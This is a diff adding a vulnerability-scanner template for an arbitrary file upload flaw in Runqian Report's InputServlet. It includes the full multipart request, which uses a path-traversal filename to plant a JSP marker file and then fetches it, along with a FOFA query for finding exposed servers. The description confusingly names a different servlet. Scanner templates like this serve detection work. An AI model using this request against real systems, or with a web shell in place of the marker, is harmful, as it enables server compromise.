@@ -1,0 +1,44 @@
+id: runqian-inputservlet-fileupload
+info:
+  name: 润乾报表前台InputServlet接口任意文件上传漏洞
+  author: avic123
+  severity: critical
+  verified: true
+  description: |
+    润乾报表是一个纯JAVA的企业级报表工具，支持对J2EE系统的嵌入式部署，无缝集成。润乾报表dataSphereServlet接口存在任意文件上传漏洞。
+    fofa：body="润乾报表" || body="/raqsoft"
+  reference:
+    - https://blog.csdn.net/weixin_48539059/article/details/140660326
+  tags: runqian,fileupload
+  created: 2025/01/23
+
+set:
+  randstr: randomLowercase(8)
+  rand1: randomInt(1, 100)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /InputServlet?action=12
+      headers:
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+      body: |
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="upsize"
+
+        1024
+        --00content0boundary00
+        Content-Disposition: form-data; name="file"; filename="/\..\\..\\..\{{rand1}}.jsp"
+        Content-Type: image/jpeg
+
+        <%out.println("{{randstr}}");%>
+        --00content0boundary00--
+    expression: response.status == 200 && response.body.bcontains(b'_uploadFileSuccess')
+  r1:
+    request:
+      method: GET
+      path: /{{rand1}}.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes(randstr))
+expression: r0() && r1()
